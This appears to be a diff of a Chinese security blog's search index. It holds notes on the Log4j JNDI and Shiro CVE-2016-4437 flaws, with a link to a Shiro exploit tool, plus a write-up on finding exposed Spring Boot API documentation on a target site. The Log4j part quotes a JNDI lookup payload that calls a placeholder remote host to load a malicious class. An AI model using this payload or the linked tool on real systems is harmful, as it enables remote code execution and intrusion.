class="line"></span><br></pre></td></tr></table></figure>
-
-<p>以及一些变形的payload:</p>
-<p><img src="/imgs/$%7Bfiilename%7D/bf3e6d12124a407484a9a9cc1b87280d.png"></p>
-<p>这些payload的形式大多类似与这样：<br><code>$&#123;jndi:ldap://xxxx.com.cn&#125;</code>,</p>
-<p>在上文中我们了解到log4j漏洞点主要是JNDI协议下的未限制访问下载class类,所以以这些payload的形式来看更能证述我们上文的解释.</p>
-<p>payload构造一个远程访问请求返回攻击者服务器上的恶意class.如果恶意class中的恶意代码成功执行,将使受害机遭到攻击.</p>
-<p>log4j2的使用面广泛，除以Java技术为主的公司外，还有一些大量中间件都是用Java开发的，如：kafka、elasticsearch、flink</p>
-<p>（或许可以了解一下这些中间件，万一可以捡漏呢）</p>
-<p>修复：</p>
-<p>新版的log4j2在JNDI lookup中增加了很多限制彻底封锁了通过打印日志去远程加载class的这条路：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.默认不再支持二次跳转（也就是命名引用）的方式获取对象</span><br><span class="line">2.只有在log4j2.allowedLdapClasses列表中指定的class才能获取。</span><br><span class="line">3.只有远程地址是本地地址或者在log4j2.allowedLdapHosts列表中指定的地址才能获取</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="复现"><a href="#复现" class="headerlink" title="复现:"></a>复现:</h2><p>待定……..</p>
+<p>虽然是几年前的了,但到目前了影响的公司,漏洞存在的公司还是有很多滴.</p>
+<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221108125019-1668327385931.png"></p>
 ]]></content>
       <categories>
-        <category>RCE</category>
+        <category>任意文件读取</category>
       </categories>
       <tags>
         <tag>漏洞库</tag>
       </tags>
   </entry>
   <entry>
-    <title>shiro反序列化漏洞</title>
-    <url>/2022/12/13/13-29-51/</url>
-    <content><![CDATA[<h1 id="Shrio反序列化导致命令执行"><a href="#Shrio反序列化导致命令执行" class="headerlink" title="Shrio反序列化导致命令执行"></a>Shrio<a href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">反序列化</a>导致命令执行</h1><h2 id="漏洞编号：CVE-2016-4437"><a href="#漏洞编号：CVE-2016-4437" class="headerlink" title="漏洞编号：CVE-2016-4437"></a>漏洞编号：CVE-2016-4437</h2><h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a href="https://blog.csdn.net/Aaron_Miller/article/details/106475088"> Shiro反序列化漏洞_風月长情的博客-CSDN博客_shiro反序列化漏洞</a></p>
-<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>  Apache Shiro是一款开源企业常见JAVA安全框架，提供身份验证、授权、密码学和会话管理。java中的权限框架有SpringSecurity和Shiro，由于Spring功能强大但复杂，Shiro的简单强大，扩展性好因此用的还是很多。</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Shiro &lt; 1.2.4</p>
-<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>  Apache Shiro框架提供了记住我的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。cookie的key为RememberMe，cookie的值是经过相关信息进行序列化，然后使用AES加密（对称），最后再使用Base64编码处理。服务端在接收cookie时：</p>
-<p>1.检索RememberMe Cookie的值<br>2.Base 64解码<br>3.AES解密（加密密钥硬编码）<br>4.进行反序列化操作（未过滤处理）</p>
-<p>攻击者可以使用Shiro的默认密钥构造恶意序列化对象进行编码来伪造用户的Cookie，服务端反序列化时触发漏洞，从而执行命令。</p>
-<h2 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征:"></a>漏洞特征:</h2><p>最主要的特征就是登录返回包中含有<strong>rememberMe=deleteMe</strong>字段</p>
-<p><img src="/imgs/$%7Bfiilename%7D/QQ%E6%88%AA%E5%9B%BE20221213141911.png"></p>
-<p>准备充足在搞,先做好在本地复现的准备,安全第一</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用:"></a>漏洞利用:</h2><p>1.一键利用工具：</p>
-<p>链接：<a href="https://pan.baidu.com/s/1kvQEMrMP-PZ4K1eGwAP0_Q?pwd=zbgp">https://pan.baidu.com/s/1kvQEMrMP-PZ4K1eGwAP0_Q?pwd=zbgp</a><br>提取码：zbgp</p>
-<p><img src="/imgs/$%7Bfiilename%7D/image-20221213144910895.png" alt="image-20221213144910895"></p>
-<p>工具使用：<a href="https://www.iculture.cc/forum-post/17719.html">加强版图形界面shiro反序列化漏洞利用工具 shiro_attack-网络攻防学习社区-安全圈子-FancyPig’s blog (iculture.cc)</a></p>
+    <title>通过burp插件：TsojanScan发现springboot框架下的api接口泄露</title>
+    <url>/2023/03/19/15-55-17/</url>
+    <content><![CDATA[<h1 id="通过burp插件：TsojanScan发现springboot框架下的api接口泄露"><a href="#通过burp插件：TsojanScan发现springboot框架下的api接口泄露" class="headerlink" title="通过burp插件：TsojanScan发现springboot框架下的api接口泄露"></a>通过burp插件：TsojanScan发现springboot框架下的api接口泄露</h1><h2 id="1-先简单介绍一下这个插件："><a href="#1-先简单介绍一下这个插件：" class="headerlink" title="1.先简单介绍一下这个插件："></a>1.先简单介绍一下这个插件：</h2><p><a href="https://mp.weixin.qq.com/s/Ob6pBBQW-FSESQqQcICfSw">https://mp.weixin.qq.com/s/Ob6pBBQW-FSESQqQcICfSw</a></p>
+<p>”市面上各大漏洞探测插件的功能比较单一，因此与TsojanSecTeam成员决定在已有框架的基础上修改并增加常用的漏洞探测POC，它会以最少的数据包请求来准确检测各漏洞存在与否，你只需要这一个足矣。“</p>
+<p>效果不错，刚装上就出现了检测，该工具会在你访问网站时对网站数据包进行监测，在测试时注意看看该工具对网站的判断。</p>
+<h2 id="2-目标网站特征："><a href="#2-目标网站特征：" class="headerlink" title="2.目标网站特征："></a>2.目标网站特征：</h2><p>在目标网站的8849端口出现Tomcat的404页面。</p>
+<p><img src="/$%7Bfiilename%7D/image-20230319152015471.png" alt="image-20230319152015471"></p>
+<p>（也是前几天看文章才发现这是Tomcat的404页面。）</p>
+<p>附文章：<a href="https://mp.weixin.qq.com/s?__biz=MzkyMjM5NDM3NQ==&amp;mid=2247484801&amp;idx=1&amp;sn=cd6d496e5271d471bf19135de923f4b1&amp;chksm=c1f44fe9f683c6ff53f261d36389ab059a4ed01535c8685755ba78fe14bd6b1cb5feaa765437&amp;mpshare=1&amp;scene=1&amp;srcid=0318YaWdqgbWf0p6Pwr2BrX5&amp;sharer_sharetime=1679100509972&amp;sharer_shareid=ee9017754c31398b19b8614187cea6f2&amp;key=856e84c5d55fcfa08f2040f45ca09ac2ec104fabdb405d17179e81b038c7db5ed957dc26194be199408a447c307f58b205a66dbbb475147bd2d1c95903ea076b31e6e58ed5973f85043e87ca0407a842d9306c2f84ee116509a23ad26f1611459e250734cce00d005cbf5e366becb344afa1db5c8b0d4f8cfcb8d0a231ac3054&amp;ascene=1&amp;uin=MzEwOTQzOTA1Ng==&amp;devicetype=Windows+11+x64&amp;version=6309001c&amp;lang=zh_CN&amp;countrycode=VA&amp;exportkey=n_ChQIAhIQXq7Rt+hVRwfOiXrxQMGBlxLqAQIE97dBBAEAAAAAAJycGJP9qwUAAAAOpnltbLcz9gKNyK89dVj0zERyttew4Y9UJ9Lf294m2SXoe7Mq20Jjj0N4NN5Nrrz6B+hfYT3ahqeQ3h+PZkaoJ4aVr6gEkgunNqqMglXChXnMUj0/Q6Fjj9gnKKLOUL3Je+CLo0n+QrkeLuWDoi1pN6PXiC6jDBpKVWqxvcMzRv1uAw2waURaI9DOE4dpvNo0XSWg1bWBoMhmPfTa36Aj8Icu+9bIRQzzk8w+d5tAGK0jpLBqbpM8CEvFdD1d+wVILY0MPExLqr6g0XZ+PLCVahQILg==&amp;acctmode=0&amp;pass_ticket=hosTGulAU4YCCINrezS8MsBixvPW8HpGes6wXZ5/4UaRG5D77ohghKgnRHPpCa/AQhtedO/CpXsj7Xd7s1Y32Q==&amp;wx_header=1&amp;fontgear=2">https://mp.weixin.qq.com/s?__biz=MzkyMjM5NDM3NQ==&amp;mid=2247484801&amp;idx=1&amp;sn=cd6d496e5271d471bf19135de923f4b1&amp;chksm=c1f44fe9f683c6ff53f261d36389ab059a4ed01535c8685755ba78fe14bd6b1cb5feaa765437&amp;mpshare=1&amp;scene=1&amp;srcid=0318YaWdqgbWf0p6Pwr2BrX5&amp;sharer_sharetime=1679100509972&amp;sharer_shareid=ee9017754c31398b19b8614187cea6f2&amp;key=856e84c5d55fcfa08f2040f45ca09ac2ec104fabdb405d17179e81b038c7db5ed957dc26194be199408a447c307f58b205a66dbbb475147bd2d1c95903ea076b31e6e58ed5973f85043e87ca0407a842d9306c2f84ee116509a23ad26f1611459e250734cce00d005cbf5e366becb344afa1db5c8b0d4f8cfcb8d0a231ac3054&amp;ascene=1&amp;uin=MzEwOTQzOTA1Ng%3D%3D&amp;devicetype=Windows+11+x64&amp;version=6309001c&amp;lang=zh_CN&amp;countrycode=VA&amp;exportkey=n_ChQIAhIQXq7Rt%2BhVRwfOiXrxQMGBlxLqAQIE97dBBAEAAAAAAJycGJP9qwUAAAAOpnltbLcz9gKNyK89dVj0zERyttew4Y9UJ9Lf294m2SXoe7Mq20Jjj0N4NN5Nrrz6B%2BhfYT3ahqeQ3h%2BPZkaoJ4aVr6gEkgunNqqMglXChXnMUj0%2FQ6Fjj9gnKKLOUL3Je%2BCLo0n%2BQrkeLuWDoi1pN6PXiC6jDBpKVWqxvcMzRv1uAw2waURaI9DOE4dpvNo0XSWg1bWBoMhmPfTa36Aj8Icu%2B9bIRQzzk8w%2Bd5tAGK0jpLBqbpM8CEvFdD1d%2BwVILY0MPExLqr6g0XZ%2BPLCVahQILg%3D%3D&amp;acctmode=0&amp;pass_ticket=hosTGulAU4YCCINrezS8MsBixvPW8HpGes6wXZ5%2F4UaRG5D77ohghKgnRHPpCa%2FAQhtedO%2FCpXsj7Xd7s1Y32Q%3D%3D&amp;wx_header=1&amp;fontgear=2</a></p>
+<p>（要想生活过得去，多看美女多看报。）</p>
+<p>在进行url拼接后发现该网站符合springboot框架的特征：</p>
+<p><img src="/$%7Bfiilename%7D/image-20230319150426631.png" alt="image-20230319150426631"></p>
+<p>但这也是我后来去翻文章地址才知道的特征表现（人老了，记忆了不足了，想不起来了。）</p>
+<p>发现该接口地址还是靠以上工具的作用，但我们要知道上面页面特征才行，不然光用工具显得很呆，而且工具也会不靠谱，打铁还需自身硬。</p>
+<p>又看了一下，理论上我们是无法通过该8849端口通过js审计拿到8890端口网站的接口的</p>
+<p><img src="/$%7Bfiilename%7D/image-20230319151116366.png" alt="image-20230319151116366"></p>
+<p>因为该地址压根没有js文件，我在点开该网站时都是直接忽略了，还是前辈们厉害，好想当点鼠标的猴子啊。</p>
+<p>由于该接口功能点众多，就不放图了，在文章；链接里博主给了一个很经典的有js审计而来的例子。</p>
+<p>在本文章接口地址中，网站是直接将整个接口文档暴露了在外边我们，还清晰的指出了url拼接的basePath，也就是根目录，要想让页面不反回报错信息我们需要在js文件中找到basepath，才能拼接我们找到的接口地址。以后在查看js文件时可以先ctrl-F一下”basepath“，或许有意外收获，但更多的需要我们一个一个的去翻js文件，心谨细微不过如此。</p>
+<p>网上也有很多spring框架利用工具，大多都是基于默认目录下的接口泄露利用，先埋个坑，”前面的区域以后再来探索吧“。</p>
 ]]></content>
       <categories>
-        <category>RCE</category>
+        <category>api接口泄露</category>
       </categories>
       <tags>
-        <tag>漏洞库</tag>
+        <tag>springboot</tag>
       </tags>
   </entry>
 </search>
